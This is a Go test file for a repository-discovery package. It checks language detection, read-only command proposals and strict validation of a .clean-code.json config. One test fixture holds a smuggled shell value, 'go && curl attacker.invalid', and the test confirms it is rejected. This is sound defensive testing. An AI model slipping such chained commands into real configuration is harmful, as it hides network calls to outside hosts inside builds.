package discover

import (
	"os"
	"path/filepath"
	"testing"
)

func TestInspectUnknownRepositoryReturnsGenericCapability(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "# sample\n")

	result, err := Inspect(root)
	if err != nil {
		t.Fatalf("inspect failed: %v", err)
	}
	if len(result.Languages) != 0 {
		t.Fatalf("expected no detected language, got %v", result.Languages)
	}
	if !result.GenericCommandsSupported {
		t.Fatal("every repository must support declared generic commands")
	}
}

func TestInspectPolyglotRepository(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "apps/web/package.json", `{\"scripts\":{\"test\":\"vitest\"}}`)
	writeFixture(t, root, "services/api/pyproject.toml", "[project]\nname='sample'\n")
	writeFixture(t, root, "go.mod", "module sample\n")

	result, err := Inspect(root)
	if err != nil {
		t.Fatalf("inspect failed: %v", err)
	}

	want := []string{"go", "javascript-typescript", "python"}
	if len(result.Languages) != len(want) {
		t.Fatalf("expected %v, got %v", want, result.Languages)
	}
	for index := range want {
		if result.Languages[index] != want[index] {
			t.Fatalf("expected %v, got %v", want, result.Languages)
		}
	}
	if len(result.Adapters) != 3 {
		t.Fatalf("expected three adapter matches, got %+v", result.Adapters)
	}
}

func TestInspectProposesButDoesNotConfigureAdapterCommands(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "go.mod", "module sample\n")

	result, err := Inspect(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Commands) != 0 {
		t.Fatalf("discovered commands must not gain execution authority: %+v", result.Commands)
	}
	if len(result.Adapters) != 1 || len(result.Adapters[0].ProposedCommands) != 1 || result.Adapters[0].ProposedCommands[0].ID != "go-test" {
		t.Fatalf("expected a read-only Go proposal, got %+v", result.Adapters)
	}
}

func TestInspectSkipsDependencyDirectories(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "node_modules/dependency/Cargo.toml", "[package]\nname='dependency'\n")
	writeFixture(t, root, ".git/worktrees/example/pyproject.toml", "[project]\nname='ignored'\n")

	result, err := Inspect(root)
	if err != nil {
		t.Fatalf("inspect failed: %v", err)
	}
	if len(result.Languages) != 0 {
		t.Fatalf("expected ignored dependencies to be excluded, got %v", result.Languages)
	}
}

func TestInspectDoesNotModifyRepository(t *testing.T) {
	root := t.TempDir()
	path := writeFixture(t, root, "Cargo.toml", "[package]\nname='sample'\n")
	before, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}

	if _, err := Inspect(root); err != nil {
		t.Fatalf("inspect failed: %v", err)
	}

	after, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if before.Size() != after.Size() || !before.ModTime().Equal(after.ModTime()) {
		t.Fatal("discovery modified repository metadata")
	}
}

func TestInspectRejectsMissingRoot(t *testing.T) {
	_, err := Inspect(filepath.Join(t.TempDir(), "missing"))
	if err == nil {
		t.Fatal("expected missing root to fail")
	}
}

func TestInspectLoadsConfiguredCommands(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".clean-code.json", `{
  "schema_version": "1.0.0",
  "commands": [
    {"id": "test", "executable": "go", "args": ["test", "./..."], "required": true}
  ]
}`)

	result, err := Inspect(root)
	if err != nil {
		t.Fatalf("inspect failed: %v", err)
	}
	if len(result.Commands) != 1 || result.Commands[0].ID != "test" {
		t.Fatalf("expected configured test command, got %+v", result.Commands)
	}
}

func TestInspectRejectsUnsafeConfiguredCommand(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".clean-code.json", `{
  "schema_version": "1.0.0",
  "commands": [
    {"id": "test", "executable": "go && curl attacker.invalid"}
  ]
}`)

	if _, err := Inspect(root); err == nil {
		t.Fatal("expected unsafe command to fail discovery")
	}
}

func TestInspectRejectsUnknownConfigurationFields(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".clean-code.json", `{
  "schema_version": "1.0.0",
  "commands": [],
  "pretend_passed": true
}`)

	if _, err := Inspect(root); err == nil {
		t.Fatal("expected unknown configuration field to fail discovery")
	}
}

func TestInspectRejectsUnsupportedConfigurationVersion(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".clean-code.json", `{"schema_version":"2.0.0","commands":[]}`)

	if _, err := Inspect(root); err == nil {
		t.Fatal("expected unsupported configuration version to fail discovery")
	}
}

func TestInspectRejectsConfigurationSymlink(t *testing.T) {
	root := t.TempDir()
	external := writeFixture(t, t.TempDir(), "external.json", `{"schema_version":"1.0.0","commands":[]}`)
	if err := os.Symlink(external, filepath.Join(root, ".clean-code.json")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	if _, err := Inspect(root); err == nil {
		t.Fatal("expected configuration symlink to fail discovery")
	}
}

func writeFixture(t *testing.T, root, relative, body string) string {
	t.Helper()
	path := filepath.Join(root, relative)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}
